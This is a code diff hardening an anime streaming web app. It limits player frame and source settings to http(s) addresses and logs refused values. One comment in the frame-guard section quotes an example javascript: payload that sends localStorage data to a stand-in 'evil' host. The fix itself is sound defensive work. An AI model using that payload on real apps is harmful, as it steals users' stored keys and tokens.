@@ -7202,7 +7202,13 @@ function watchParty(title,ep,aniId){
   const own=aniId?anime.find(x=>+x.aniId===+aniId):null;
   const ext=document.getElementById('pvExt');ext.onclick=()=>{const u=findUrl(own||{title});if(u&&u!=='about:blank')document.getElementById('pvFrame').src=u;};
   const purl=partyStreamURL(title,ep,aniId);
-  document.getElementById('pvFrame').src=purl||"data:text/html,<body style='margin:0;background:%230b0b0f;color:%23aaa;font:15px -apple-system,system-ui;display:flex;align-items:center;justify-content:center;text-align:center;padding:24px;height:100vh'>Set your own streaming source in Settings, or use <b style='color:%23fff'>&nbsp;Broadcast your screen&nbsp;</b> to watch together.</body>";
+  // srcdoc, not a data: URL — the frame's src now accepts http(s) only, and this
+  // is app-authored markup rather than an address anyway.
+  {
+    const _f=document.getElementById('pvFrame');
+    if(purl)_f.src=purl;
+    else{_f.removeAttribute('src');_f.srcdoc="<body style='margin:0;background:#0b0b0f;color:#aaa;font:15px -apple-system,system-ui;display:flex;align-items:center;justify-content:center;text-align:center;padding:24px;height:100vh'>Set your own streaming source in Settings, or use <b style='color:#fff'>&nbsp;Broadcast your screen&nbsp;</b> to watch together.</body>";}
+  }
   document.getElementById('playerView').classList.add('on');
   try{document.documentElement.classList.add('watching');}catch(e){}
   renderPvNav(null);
@@ -8930,6 +8936,7 @@ function titleWatchPickerHTML(a){
 function setTitleService(id,url){
   var a=anime.find(function(x){return x.id===id;});if(!a)return;
   url=(url||'').trim();
+  if(url&&!/^https?:\/\//i.test(url)){toast('That doesn\u2019t look like a website address');return;}
   if(url&&(a.srcUrl||'')===url)url='';   // tap the selected service again → back to default
   if(url){a.srcUrl=url;}else{delete a.srcUrl;}
   touch(a);save();renderDetail();
@@ -8945,6 +8952,7 @@ function togglePin(){const el=document.getElementById('dtPin');if(el)el.style.di
 function savePin(id){
   const a=anime.find(x=>x.id===id);if(!a)return;
   const v=((document.getElementById('dtPinIn')||{}).value||'').trim();
+  if(v&&!/^https?:\/\//i.test(v)){toast('That doesn\u2019t look like a website address');return;}
   if(v)a.srcUrl=v; else delete a.srcUrl;
   touch(a);save();renderDetail();
   toast(v?'Direct link pinned for this show':'Link cleared');
@@ -9688,13 +9696,36 @@ function pvFrameNavigated(){
 // Every src we assign is ours; the next load after it is not the user navigating.
 // Intercepting the property covers all eleven call sites at once, including the
 // retry, the in-frame search and the about:blank on close.
+// The player's frame is sandboxed "allow-scripts allow-same-origin", which the
+// spec is explicit about: those two together are not a barrier. So whatever ends
+// up in its src runs with this origin's powers — the list, the sync code, the AI
+// key, the admin token.
+//
+// A source is not always something the user typed. Accepting a shared setup
+// copies a stranger's source template in, and "javascript:fetch('https://evil/?d='
+// + localStorage.getItem(...))" is a valid string to put in a text field. Every
+// setter is guarded below, but setters can be added and missed; this is the one
+// place every frame load has to pass through, so it is the guarantee rather than
+// the reminder.
+function safeFrameSrc(v){
+  const u=String(v==null?'':v).trim();
+  if(!u||u==='about:blank')return 'about:blank';
+  return /^https?:\/\//i.test(u)?u:'about:blank';
+}
 (function pvWatchFrameNav(){
   const f=document.getElementById('pvFrame'); if(!f)return;
   try{
     const d=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'src');
     Object.defineProperty(f,'src',{configurable:true,
       get(){return d.get.call(f);},
-      set(v){_pvOwnNav=true;d.set.call(f,v);}});
+      set(v){
+        const safe=safeFrameSrc(v);
+        if(safe!=='about:blank'&&safe!==String(v).trim()){}
+        if(safe==='about:blank'&&String(v||'').trim()&&String(v).trim()!=='about:blank'){
+          try{logProblem('security','refused a non-web address in the player',String(v).slice(0,80));}catch(e){}
+        }
+        _pvOwnNav=true;d.set.call(f,safe);
+      }});
   }catch(e){}
   f.addEventListener('load',()=>{try{pvFrameNavigated();}catch(e){}});
 })();
@@ -11521,6 +11552,7 @@ function renderSource(){
   try{restoreSrcDraft();}catch(e){}
 }
 function setReadSource(v){
+  if(v&&!/^https?:\/\//i.test(String(v).trim())){toast('That doesn\u2019t look like a website address');return;}
   try{if(v)localStorage.setItem('read_src',v);else localStorage.removeItem('read_src');}catch{}
   renderSource();
   toast(v?'Reading source set':'Back to AsuraScans');
@@ -11539,6 +11571,7 @@ function saveReadSource(){
   setReadSource(v);
 }
 function setSource(v){
+  if(v&&!/^https?:\/\//i.test(String(v).trim())){toast('That doesn\u2019t look like a website address');return;}
   if(v&&streamSource()===v)v='';   // tap the selected chip again → deselect, back to default
   try{localStorage.removeItem('no_source');}catch{}   // choosing any source exits "no source" mode
   try{if(v)localStorage.setItem('stream_src',v);else localStorage.removeItem('stream_src');}catch{}
